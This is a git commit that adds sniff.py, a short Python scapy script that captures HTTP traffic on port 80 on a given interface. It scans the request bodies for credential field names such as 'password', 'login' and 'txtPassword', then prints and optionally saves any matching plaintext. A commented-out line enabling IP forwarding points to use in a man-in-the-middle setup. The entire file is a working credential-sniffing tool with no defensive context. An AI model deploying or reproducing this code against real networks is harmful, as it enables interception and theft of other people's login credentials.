d612c2b2ebb2ea6caafc5cb5e73419b79a0bdc63
6AI-L <81833598+6AI-L@users.noreply.github.com>
2021-04-03 17:49:37 +0200

    Create sniff.py

---
+++ sniff.py
@@ -0,0 +1,41 @@
+import scapy.all as scapy
+from scapy.layers import http
+import sys
+import os
+import argparse
+import platform
+#os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+parser=argparse.ArgumentParser()
+parser.add_argument("-i", dest="interface", help="use this interface for capturing")
+parser.add_argument("-w", dest="write", help="write to file")
+insert=parser.parse_args()
+i=insert.interface
+file=insert.write
+if file!=None:
+    of=open(file, "a")
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=packet_process, filter="port 80")    
+
+def packet_process(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            content=packet[scapy.Raw].load
+            keywords=["pwd", "passwd", "password", "usr", "user", "uname", "login", "pass", "submit", "txtPassword", "txtUser"]
+            try:
+                content=content.decode("utf-8")
+                for key in keywords:
+                    if key in content:
+                        print(content)
+                        if file!=None:
+                            of.writelines(str(content)+(str("\n")))
+                        break
+            except:
+                pass
+
+if i==None:
+    print("[!] No interface specified")
+    print("[I] sniff.py -i INTERFACE")
+
+if i!=None:
+    print("[+] waiting...")
+    sniff(i)
